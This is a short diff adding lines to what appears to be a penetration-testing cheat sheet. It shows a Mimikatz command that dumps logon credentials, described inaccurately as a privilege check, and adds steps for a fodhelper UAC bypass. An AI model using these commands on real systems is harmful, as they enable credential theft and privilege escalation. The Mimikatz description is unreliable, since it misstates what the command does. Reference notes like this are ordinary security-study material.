@@ -22,3 +22,7 @@ Mimikatz:
 
 Mimikatz privilege::debug sekurlsa::logonpasswords : To check the privileges on the system
 
+Fodhelper:
+
+1> Import the fodhelper script
+2> helper -custom "command to be run" : To bypass UAC
